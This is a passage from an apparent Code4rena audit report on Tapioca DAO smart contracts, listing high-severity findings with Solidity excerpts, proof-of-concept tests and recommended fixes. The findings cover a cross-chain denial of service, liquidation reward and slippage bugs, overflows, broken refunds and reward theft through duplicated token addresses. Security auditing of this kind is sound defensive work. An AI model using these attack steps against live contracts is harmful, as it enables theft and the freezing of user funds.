4.  On the host chain, the `twTAP` contract receives the cross chain message and mint a `twTAP` with `tokenId` `1` to attacker as it does not exist on host chain yet. (Note this cross-chain transfer is part of Layer Zero ONFT71 mechanism)
5.  Now on the host chain, we have a `twTAP` with `tokenId` `1` but `mintedTwTap` is still `0`. That means when users try to `participate()` on the host chain, it will try to mint a `twTAP` with `tokenId` `1`, and that will fail as it now exists on the host chain. At this point `participate()` will be permanently DoS, affecting governance and causing loss of rewards.
6.  Note that the attacker can then transfer the `twTAP` back to the source chain and exit position to retrieve the locked `TAP` token. However, the host chain still remain frozen as the owner of `tokenId` `1` will now be `twTAP` contract itself after the cross chain transfer.

Note that the attack is still possible even when `mintedTwTap > 0` on host chain as attacker just have to repeatly mint on the non-host chain till it obtain the required `tokenId`.

### Recommended Mitigation Steps

Add in access control to prevent host-chain-only operations such as `participate()` from being executed on other chains .

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1170#issuecomment-1702892899)**

***

## [[H-20] `_liquidateUser()` should not re-use the same minimum swap amount out for multiple liquidation](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1168)
*Submitted by [peakbolt](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1168), also found by [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1004), [Nyx](https://github.com/code-423n4/2023-07-tapioca-findings/issues/857), [n1punp](https://github.com/code-423n4/2023-07-tapioca-findings/issues/347), [Ack](https://github.com/code-423n4/2023-07-tapioca-findings/issues/338), and [rvierdiiev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/122)*

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/markets/singularity/SGLLiquidation.sol#L337-L340> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L603-L606>

### Vulnerability details

In Singularity and BigBang, the `minAssetAmount` in `_liquidateUser()` is provided by the liquidator as a slippage protection to ensure that the swap provides the specified `amountOut`. However, the same value is utilized even when `liquidate()` is used to liquidate multiple borrowers.

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/markets/singularity/SGLLiquidation.sol#L337-L351>

```Solidity
    function _liquidateUser(
        ...
        uint256 minAssetAmount = 0;
        if (dexData.length > 0) {
            //@audit the same minAssetAmount is incorrectly applied to all liquidations
            minAssetAmount = abi.decode(dexData, (uint256));
        }

        ISwapper.SwapData memory swapData = swapper.buildSwapData(
            collateralId,
            assetId,
            0,
            collateralShare,
            true,
            true
        );
        swapper.swap(swapData, minAssetAmount, address(this), "");
```

### Impact

Using the same `minAssetAmount` (minimum amountOut for swap) for the liquidation of multiple borrowers will result in inaccurate slippage protection and transaction failure.

If `minAssetAmount` is too low, there will be insufficient slippage protection and the the liquidator and protocol could be short changed with a worse than expected swap.

If `minAssetAmount` is too high, the liquidation will fail as the swap will not be successful.

### Proof of Concept

**First scenario**

1.  Liquidator liquidates two loans X & Y using `liquidate()`, and set the `minAssetAmount` to be 1000 USDO.
2.  Loan X liquidated collateral is worth 1000 USDO and the swap is completely successful with zero slippage.
3.  However, Loan Y liquidated collateral is worth 5000 USDO, but due to low liquidity in the swap pool, it was swapped at 1000 USDO (`minAssetAmount`).

The result is that the liquidator will receive a fraction of the expected reward and the protocol gets repaid at 1/5 of the price, suffering a loss from the swap.

**Second scenario**

1.  Liquidator liquidates two loans X & Y using `liquidate()`, and set the `minAssetAmount` to be 1000 USDO.
2.  Loan X liquidated collateral is worth 1000 USDO and the swap is completely successful with zero slippage.
3.  we suppose Loan Y's liquidated collateral is worth 300 USDO.

Now the `minAssetAmount` of 1000 USDO will be higher than the collateral, which is unlikely to be completed as it is higher than market price. That will revert the entire `liquidate()`, causing the liquidation of Loan X to fail as well.

### Recommended Mitigation Steps

Update `liquidate()` to allow liquidator to pass in an array of `minAssetAmount` values that corresponding to the liquidated borrower.

An alternative, is to pass in the minimum expected price of the collateral and use that to compute the `minAssetAmount`.

**[0xRektora (Tapioca) confirmed via duplicate issue 122](https://github.com/code-423n4/2023-07-tapioca-findings/issues/122)**

***

## [[H-21] Incorrect liquidation reward computation causes excess liquidator rewards to be given](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1165)
*Submitted by [peakbolt](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1165), also found by [minhtrng](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1678), [bin2chen](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1389), [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/998), [0x007](https://github.com/code-423n4/2023-07-tapioca-findings/issues/581), and 0xRobocop ([1](https://github.com/code-423n4/2023-07-tapioca-findings/issues/531), [2](https://github.com/code-423n4/2023-07-tapioca-findings/issues/89))*

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L577> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLLiquidation.sol#L310-L314>

In `_liquidateUser()` for BigBang and Singularity, the liquidator reward is derived by `_getCallerReward()`. However, it is incorrectly computed using `userBorrowPart[user]`, which is the portion of borrowed amount that does not include the accumulated fees (interests).

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L576-L580>

```Solidity
        uint256 callerReward = _getCallerReward(
            //@audit - userBorrowPart[user] is incorrect as it does not include accumulated fees
            userBorrowPart[user],
            startTVLInAsset,
            maxTVLInAsset
        );
```

Using only `userBorrowPart[user]` is inconsistent with liquidation calculation in [Market.sol#L423-L424](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L423-L424), which is based on borrowed amount including accumulated fees.

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L423-L424>

```Solidity
    function _isSolvent(
        address user,
        uint256 _exchangeRate
    ) internal view returns (bool) {
        ...
        return
            yieldBox.toAmount(
                collateralId,
                collateralShare *
                    (EXCHANGE_RATE_PRECISION / FEE_PRECISION) *
                    collateralizationRate,
                false
            ) >=
            //@audit - note that the collateralizion calculation is based on borrowed amount with fees (using totalBorrow.elastic)
            // Moved exchangeRate here instead of dividing the other side to preserve more precision
            (borrowPart * _totalBorrow.elastic * _exchangeRate) /
                _totalBorrow.base;
    }
```

As the protocol uses a dynamic liquidation incentives mechanism (see below), the liquidator will be given more rewards than required if the liquidator reward is derived by borrowed amount without accumulated fees. That is because the dynamic liquidation incentives mechanism decreases the rewards as it reaches 100% LTV. So computing the liquidator rewards using a lower value (without fees) actually gives liquidator a higher portion of the rewards.

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L442-L462>

```Solidity
    function _getCallerReward(
        uint256 borrowed,
        uint256 startTVLInAsset,
        uint256 maxTVLInAsset
    ) internal view returns (uint256) {
        if (borrowed == 0) return 0;
        if (startTVLInAsset == 0) return 0;

        if (borrowed < startTVLInAsset) return 0;
        if (borrowed >= maxTVLInAsset) return minLiquidatorReward;

        uint256 rewardPercentage = ((borrowed - startTVLInAsset) *
            FEE_PRECISION) / (maxTVLInAsset - startTVLInAsset);

        int256 diff = int256(minLiquidatorReward) - int256(maxLiquidatorReward);
        int256 reward = (diff * int256(rewardPercentage)) /
            int256(FEE_PRECISION) +
            int256(maxLiquidatorReward);

        return uint256(reward);
    }
```

### Impact

The protocol is shortchanged as it gives liquidator more rewards than required.

### Proof of Concept

1.  Add the following console.log to [BigBang.sol#L581\`](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L581)

```Solidity
        console.log("    callerReward (without fees) = \t %d (actual)", callerReward);
    
        callerReward= _getCallerReward(
            //userBorrowPart[user],
            //@audit borrowed amount with fees
            (userBorrowPart[user] * totalBorrow.elastic) / totalBorrow.base, 
            startTVLInAsset,
            maxTVLInAsset
        );
        console.log("    callerReward (with fees)  = \t %d (expected)", callerReward);
```

2.  Add and run the following test in `bigBang.test.ts`. The console.log will show that the expected liquidator reward is lower when computed using borrowed amount with fees.

<details>

```Solidity
        it.only('peakbolt - liquidation reward computation', async () => {
            const {
                wethBigBangMarket,
                weth,
                wethAssetId,
                yieldBox,
                deployer,
                eoa1,
                __wethUsdcPrice,
                __usd0WethPrice,
                multiSwapper,
                usd0WethOracle,
                timeTravel,
            } = await loadFixture(register);

            await weth.approve(yieldBox.address, ethers.constants.MaxUint256);
            await yieldBox.setApprovalForAll(wethBigBangMarket.address, true);

            await weth
                .connect(eoa1)
                .approve(yieldBox.address, ethers.constants.MaxUint256);
            await yieldBox
                .connect(eoa1)
                .setApprovalForAll(wethBigBangMarket.address, true);

            const wethMintVal = ethers.BigNumber.from((1e18).toString()).mul(
                10,
            );
            await weth.connect(eoa1).freeMint(wethMintVal);
            const valShare = await yieldBox.toShare(
                wethAssetId,
                wethMintVal,
                false,
            );
            await yieldBox
                .connect(eoa1)
                .depositAsset(
                    wethAssetId,
                    eoa1.address,
                    eoa1.address,
                    0,
                    valShare,
                );

            console.log("wethMintVal = %d", wethMintVal);
            console.log("__wethUsdcPrice = %d", __wethUsdcPrice);

            console.log("--------------------- addCollateral ------------------------");
        
            await wethBigBangMarket
                .connect(eoa1)
                .addCollateral(eoa1.address, eoa1.address, false, 0, valShare);

            //borrow
            const usdoBorrowVal = wethMintVal
                .mul(74) 
                .div(100)
                .mul(__wethUsdcPrice.div((1e18).toString()));

            console.log("--------------------- borrow ------------------------");
            await wethBigBangMarket
                .connect(eoa1)
                .borrow(eoa1.address, eoa1.address, usdoBorrowVal);

            // Can't liquidate
            const swapData = new ethers.utils.AbiCoder().encode(
                ['uint256'],
                [1],
            );

            timeTravel(100 * 86400);

            console.log("--------------------- price drop ------------------------");

            const priceDrop = __usd0WethPrice.mul(15).div(10).div(100);
            await usd0WethOracle.set(__usd0WethPrice.add(priceDrop));

            await wethBigBangMarket.updateExchangeRate();


            const borrowPart = await wethBigBangMarket.userBorrowPart(
                eoa1.address,
            );

            console.log("--------------------- liquidate (success) ------------------------");

            await expect(
                wethBigBangMarket.liquidate(
                    [eoa1.address],
                    [borrowPart],
                    multiSwapper.address,
                    swapData,
                ),
            ).to.not.be.reverted;

            return; 
           
        });
```

</details>

### Recommended Mitigation Steps

Change [BigBang.sol#L576-L580](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L576-L580), [SGLLiquidation.sol#L310-L314](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLLiquidation.sol#L310-L314), [Market.sol#L364](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L364) from

```Solidity
        uint256 callerReward = _getCallerReward(
            userBorrowPart[user],
            startTVLInAsset,
            maxTVLInAsset
        );
```

to

```Solidity
        uint256 callerReward = _getCallerReward(
            (userBorrowPart[user] * totalBorrow.elastic) / totalBorrow.base,
            startTVLInAsset,
            maxTVLInAsset
        );
```

**[0xRektora (Tapioca) confirmed via duplicate issue 89](https://github.com/code-423n4/2023-07-tapioca-findings/issues/89)**

***

## [[H-22] Lack of safety buffer between liquidation threshold and LTV ratio for borrowers to prevent unfair liquidations](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1164)
*Submitted by [peakbolt](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1164)*

In BigBang and Singularity, there is no safety buffer between liquidation threshold and LTV ratio, to protects borrowers from being immediately liquidated due to minor market movement when the loan is taked out at max LTV.

The safety buffer also ensure that the loans can be returned to a healthy state after the first liquidation. Otherwise, the loan can be liquidated repeatly as it will remain undercollateralized after the first liquidation.

### Detailed Explanation

The `collateralizationRate` determines the LTV ratio for the max amount of assets that can be borrowed with the specific collateral. This check is implemented in `_isSolvent()` as shown below.

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L402-L425>

```Solidity
    function _isSolvent(
        address user,
        uint256 _exchangeRate
    ) internal view returns (bool) {
        // accrue must have already been called!
        uint256 borrowPart = userBorrowPart[user];
        if (borrowPart == 0) return true;
        uint256 collateralShare = userCollateralShare[user];
        if (collateralShare == 0) return false;

        Rebase memory _totalBorrow = totalBorrow;

        return
            yieldBox.toAmount(
                collateralId,
                collateralShare *
                    (EXCHANGE_RATE_PRECISION / FEE_PRECISION) *
                    collateralizationRate,
                false
            ) >=
            // Moved exchangeRate here instead of dividing the other side to preserve more precision
            (borrowPart * _totalBorrow.elastic * _exchangeRate) /
                _totalBorrow.base;
    }
```

However, the liquidation start threshold, which is supposed to be higher (e.g. 80%) than LTV ratio (e.g. 75%), is actually using the same `collateralizationRate` value. We can see that `computeClosingFactor()` allow liquidation to start when the loan is at max LTV.

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L283-L284>

```Solidity
        uint256 liquidationStartsAt = (collateralPartInAssetScaled *
            collateralizationRate) / (10 ** ratesPrecision);
```

### Impact

Borrowers can be unfairly liquidated and penalized due to minor market movement when taking loan at max LTV. Also loan can be repeatedly liquidated regardless of closing factor as it does not return to healthy state after the first liquidation.

### Proof of Concept

Consider the following scenario,

1.  Borrower take out loan at max LTV (75%).
2.  Immediately after the loan is taken out, the collateral value dropped slightly due to minor market movement and the loan is now at 75.000001% LTV.
3.  However, as the liquidation start threshold begins to at 75% LTV, bots start to liquidate the loan, before the borrower could react and repay the loan.
4.  The liquidation will cause the loan to remain undercollateralized despite the closing factor.
5.  As the loan is still unhealthy, the bots will then be able to repeatly liquidate the loan.
6.  Borrower is unfairly penalized and suffers losses due to the liquidations.

### Recommended Mitigation Steps

Implement the liquidation threshold as a separate state variable and ensure it is higher than LTV to provide a safety buffer for borrowers.

**[cryptotechmaker (Tapioca) confirmed and commented](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1164#issuecomment-1707787049):**
 > The user is not liquidated for his entire position but only for the amount necessary for the loan to become solvent again. 

> Loaning up to the collateralization rate threshold is up to the user and opening such an edging position comes with some risks that the user should be aware of. 
> 
> However, adding the buffer seems fair. It can remain as a ‘High’.

***

## [[H-23] Refund mechanism for failed cross-chain transactions does not work](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1163)
*Submitted by [peakbolt](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1163), also found by [Kaysoft](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1410), [windhustler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1302), carrotsmuggler ([1](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1029), [2](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1001)), [xuwinnie](https://github.com/code-423n4/2023-07-tapioca-findings/issues/711), and [cergyk](https://github.com/code-423n4/2023-07-tapioca-findings/issues/239)*

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOLeverageModule.sol#L180-L185> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOMarketModule.sol#L178-L186> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOOptionsModule.sol#L187-L197> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L195-L200> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L170-L175> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L202-L212> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L163-L168>

There is a refund mechanism in `USDO` and `TOFT` modules that will return funds when the execution on the destination chain fails.

It happens when `module.delegatecall()` fails, where the following code (see below) will trigger a refund of the bridged fund to the user. After that a revert is then 'forwarded' to the main executor contract (`BaseUSDO` or `BaseTOFT`).

However, the issue is that the revert will also reverse the refund even when the revert is forwarded.

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOLeverageModule.sol#L180-L185>

```Solidity
        if (!success) {
            if (balanceAfter - balanceBefore >= amount) {
                IERC20(address(this)).safeTransfer(leverageFor, amount);
            }

            //@audit - this revert will actually reverse the refund before this
            revert(_getRevertMsg(reason)); //forward revert because it's handled by the main executor
        }
```

Although the main executor contract will `_storeFailedMessage()` to allow users to `retryMessage()` and re-execute the failed transaction, it will not go through if the error is permanent. That means the `retryMessage()` will also revert and there is no way to recover the funds.

### Impact

User will lose their bridged fund if the cross chain execution encounters a permanent error, which will permanently lock up the bridged funds in the contract as there is no way to recover it.

### Proof of Concept

1.  Add a `revert()` in `leverageUpInternal()` within `USDOLeverageModule.sol#L197` as follows, to simulate a permanent failure for the remote execution at destination chain.

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOLeverageModule.sol#L197>.

```Solidity
function leverageUpInternal(
        uint256 amount,
        IUSDOBase.ILeverageSwapData memory swapData,
        IUSDOBase.ILeverageExternalContractsData memory externalData,
        IUSDOBase.ILeverageLZData memory lzData,
        address leverageFor
    ) public payable {

        //@audit - to simulate a permanent failure for this remote execution (e.g. issue with swap)
        revert();

        ...
    }
```

2.  Add the following `console.log` to [singularity.test.ts#L4113](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/test/singularity.test.ts#L4113)

```Solidity
            console.log("USDO_10 balance for deployer.address (expected to be equal to 10000000000000000000) : ", await USDO_10.balanceOf(deployer.address));
```

3.  Run the test case `'should bounce between 2 chains'` under `'multiHopBuyCollateral()'` tests in `singularity.test.ts`. It will show that the `deployer.address` fails to receive the refund amount.

### Recommended Mitigation Steps

Implement a 'pull' mechanism for users to withdraw the refund instead of 'pushing' to the user.

That can be done by using a a new state variable within `USDO` and `TOFT` to store the refund amount for the transaction with the corresponding `payloadHash` for `failedMessages` mapping.

Checks must be implemented to ensure that if user withdraws the refund, the corresponding `failedMessages` entry is cleared so that the user cannot retry the transaction again.

Similarly, if `retryMessage()` is used to re-execute the transaction successfully, the refund amount in the new state variable should be cleared.

**[0xRektora (Tapioca) confirmed via duplicate issue #1410](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1410)**

***

## [[H-24] Incorrect formula used in function `Market.computeClosingFactor()`](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1145)
*Submitted by [KIntern\_NA](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1145), also found by [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1007) and [0xRobocop](https://github.com/code-423n4/2023-07-tapioca-findings/issues/699)*

Incorrect amount of assets that will be liquidated

### Proof of Concept

Function `BigBang._liquidateUser()` is used to liquidate an under-collateralization position in the market. This function calls `BigBang._updateBorrowAndCollateralShare()` to calculate the amount of `borrowPart` and `collateralShare` that will be removed from the user's position and update the storage.

The amount of `borrowPart` to be removed can be calculated using the function `Market.computeClosingFactor()`. This amount will then be converted to `borrowAmount`, which is the corresponding elastic amount, and be used to determine the amount of `collateralShare` that needs to be removed.

*   [Link to function](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L790-L815)

However, the returned value from `Market.computeClosingFactor()` is incorrect, which leads to the wrong update for the user's position.

To prove the statement above, let's denote:

*   `x`: The elastic amount that will be removed to execute the liquidation.
*   `userElastic` and `userElastic'`: The elastic amount corresponding to `userBorrowPart[user]` before and after the liquidation.
*   `collateralShare` and `collateralShare'`: The value of `userCollateralShare[user]` before and after the liquidation.
*   Following the implementation of [`yieldBox.toAmount()`](https://github.com/Tapioca-DAO/YieldBox/blob/f5ad271b2dcab8b643b7cf622c2d6a128e109999/contracts/YieldBoxRebase.sol#L41-L60) and [`yieldBox.toShare()`](https://github.com/Tapioca-DAO/YieldBox/blob/f5ad271b2dcab8b643b7cf622c2d6a128e109999/contracts/YieldBoxRebase.sol#L18-L38), in one transaction we can denote that:
    *   `yieldBox.toAmount()`: A multiplication expression with a constant `C`.
    *   `yieldBox.toShare()`: A division expression with constant `C`.

Following the update of these variables depicted in the function `BigBang._updateBorrowAndCollateralShare()`, we have:

*   $userElastic' = userElastic - x$
*   $collateralShare' = collateralShare - \frac{x \times (1+liquidationMultiplier)&ast;\frac{exchangeRate}{10^{18}}}{C}$

After the liquidation, the function `Market._isSolvent(user)` must return true. In other words, at least the following [equation](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L414-L424) should hold:

*   $C \times (collateralShare' \times \frac{collateralRate}{10^5} \times \frac{10^{18}}{exchangeRate}) = userElastic'$

Solving the equation, we get:

1.  $C \times (collateralShare' \times \frac{collateralRate}{10^5} \times \frac{10^{18}}{exchangeRate}) = userElastic'$
2.  $C \times collateralShare \times \frac{collateralRate}{10^5} \times \frac{10^{18}}{exchangeRate} - x \times (1 + \frac{liquidationMultiplier}{10^5}) \times \frac{collateralizationRate}{10^5} = userElastic - x$
3.  $x = \frac{userElastic - C \times collateralShare \times \frac{collateralRate}{10^5} \times \frac{10^{18}}{exchangeRate}}{1 - (1 + \frac{liquidationMultiplier}{10^5}) &ast; \frac{collateralizationRate}{10^5}}$

So, the returned value of the function `Market.computeClosingFactor()` should be the corresponding base amount of `x` (`totalBorrow.toBase(x, false)`).

Comparing it to the current [implementation](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L256-L297) of `computeClosingFactor()`, we can see the issues are:

*   The implementation uses the `borrowPart` in the numerator instead of the corresponding elastic amount of `borrowPart`.
*   The multiplication with `borrowPartDecimals` and `collateralPartDecimals` doesn't make sense since these decimals can be different and may cause the numerator to underflow.

### Recommended Mitigation Steps

Correct the formula of function `computeClosingFactor()` following the section "Proof of Concept".

**[cryptotechmaker (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1145#issuecomment-1707775040)**

***

## [[H-25] Overflow risk in Market contract](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1109)
*Submitted by [KIntern\_NA](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1109)*

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L415-L421> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L390-L396>

Actions of users (borrow, repay, removeCollateral, ...) in Martket contract might be reverted by overflow, resulting in their funds might be frozen.

### Proof of concept

Function `_isSolvent` in `Market` contract use conversion from share to amount of yieldBox.

```solidity
yieldBox.toAmount(
    collateralId,
    collateralShare *
        (EXCHANGE_RATE_PRECISION / FEE_PRECISION) *
        collateralizationRate,
    false
)
```

It will trigger `_toAmount` function in `YieldBoxRebase` contract

```solidity
function _toAmount(
    uint256 share,
    uint256 totalShares_,
    uint256 totalAmount,
    bool roundUp
) internal pure returns (uint256 amount) {
    totalAmount++;
    totalShares_ += 1e8;

    amount = (share * totalAmount) / totalShares_;

    if (roundUp && (amount * totalShares_) / totalAmount < share) {
        amount++;
    }
}
```

The calculation `amount = (share * totalAmount) / totalShares_` might be overflow because
`share * totalAmount` = `collateralShare * (EXCHANGE_RATE_PRECISION / FEE_PRECISION) * collateralizationRate * totalAmount`

In the default condition,<br>
`EXCHANGE_RATE_PRECISION` = 1e18,<br>
`FEE_PRECISION` = 1e5,<br>
`collateralizationRate` = 0.75e18

The `collateralShare` is equal to around `1e8 * collateralAmount` by default (because `totalAmount++; totalShares_ += 1e8;` is present in the `_toAmount` function).

\=> **`share * totalAmount` \~= (collateralAmount &ast; 1e8) &ast; (1e18 / 1e5) &ast; 0.75e18 &ast; totalAmount = collateralAmount &ast; totalAmount &ast; 0.75e39**

This formula will overflow when `collateralAmount * totalAmount` > 1.5e38. This situation can occur easily with 18-decimal collateral. As a consequence, user transactions will revert due to overflow, resulting in the freezing of market functionalities.

The same issue applies to the calculation of `_computeMaxBorrowableAmount` in the Market contract.

### Recommended Mitigation Steps

Reduce some variables used to trigger yieldBox.toAmount(), such as `EXCHANGE_RATE_PRECISION` and `collateralizationRate`, and use these variables to calculate with the obtained amount.
Example, the expected amount can be calculated as:

```solidity
yieldBox.toAmount(
    collateralId,
    collateralShare
    false
) * (EXCHANGE_RATE_PRECISION / FEE_PRECISION) * collateralizationRate
```

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1109#issuecomment-1701992223)**

***

## [[H-26] Not enough TAP tokens to exercise if a user participates and exercises in the same epoch](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1101)
*Submitted by [KIntern\_NA](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1101)*

Users were unable to purchase their deserved amount of TAPs

### Proof of Concept

During each `epoch` and for a specific `sglAssetID`, there is a fixed amount of TAP tokens that will be minted and stored in the STORAGE mapping `singularityGauges[epoch][sglAssetID]`. Users have the option to purchase these TAP tokens by first calling the function `TapiocaOptionBroker.participate()` and then executing `TapiocaOptionBroker.exerciseOption()` before the position expires to buy TAPs at a discounted price. The amount of TAP tokens that a user can purchase with each position can be calculated using the formula:

    eligibleTapAmount = position.amount * gaugeTotalForEpoch / totalPoolDeposited

    - position.amount: The locked amount of the position in `sglAssetId`.
    - gaugeTotalForEpoch: The total number of TAP tokens that can be minted for the `(epoch, sglAssetId)`.
    - totalPoolDeposited: The total locked amount of all positions in `sglAssetId`.

The flaw arises when a user who participates in `sglAssetId` in the current epoch can immediately call `exerciseOption()` to purchase the TAP tokens. This results in a situation where the participants cannot exercise their expected TAP tokens.

For example:

*   Both Alice and Bob participate in the broker with `position.amount = 1`.
*   The amount of TAP tokens allocated for the current epoch is `gaugeTotalForEpoch = 60`.
*   Alice calls `exerciseOption()` to buy `eligibleAmount = 1 * 60 / 2 = 30` TAPs.
*   In the same epoch, Candice participates in the broker with `position.amount = 1` and immediately calls `exerciseOption()`. She will buy `eligibleAmount = 1 * 60 / 3 = 20` TAPs.
*   When Bob calls `exerciseOption`, he can buy `eligibleAmount = 1 * 60 / 3 = 20` TAPs, but this cannot happen since if Bob decides to buy 20 TAPs, the total minted amount of TAPs will exceed `gaugeTotalForEpoch` (30 + 20 + 20 = 70 > 60), resulting in a revert.

### Recommended Mitigation Steps

Consider developing a technique similar to the one implemented in [`twTAP.sol`](https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/governance/twTAP.sol#L343-L344) for storing the `netAmounts`. When a user participates in the broker, perform the following actions:

*   `netAmounts[block.timestamp+1] += lock.amount`
*   `netAmounts[lockTime+lockDuration] += lock.amount`

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1101#issuecomment-1702850526)**

***

## [[H-27] Attacker can pass duplicated reward token addresses to steal the reward of contract `twTAP.sol`](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1094)
*Submitted by [KIntern\_NA](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1094), also found by [bin2chen](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1304) and [glcanvas](https://github.com/code-423n4/2023-07-tapioca-findings/issues/589)*

The attacker can exploit the contract `twTAP.sol` to steal rewards.

### Proof of Concept

The function `twTAP.claimAndSendRewards() -> twTAP._claimRewardsOn()` is intended for users who utilize the cross-chain message of `BaseTOFT.sol` to claim a specific set of reward tokens.

```solidity
/// link = https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/governance/twTAP.sol#L499-L519
function _claimRewardsOn(
    uint256 _tokenId,
    address _to,
    IERC20[] memory _rewardTokens
) internal {
    uint256[] memory amounts = claimable(_tokenId);
    unchecked {
        uint256 len = _rewardTokens.length;
        for (uint256 i = 0; i < len; ) {
            uint256 claimableIndex = rewardTokenIndex[_rewardTokens[i]];
            uint256 amount = amounts[i];

            if (amount > 0) {
                // Math is safe: `amount` calculated safely in `claimable()`
                claimed[_tokenId][claimableIndex] += amount;
                rewardTokens[claimableIndex].safeTransfer(_to, amount);
            }
            ++i;
        }
    }
}
```

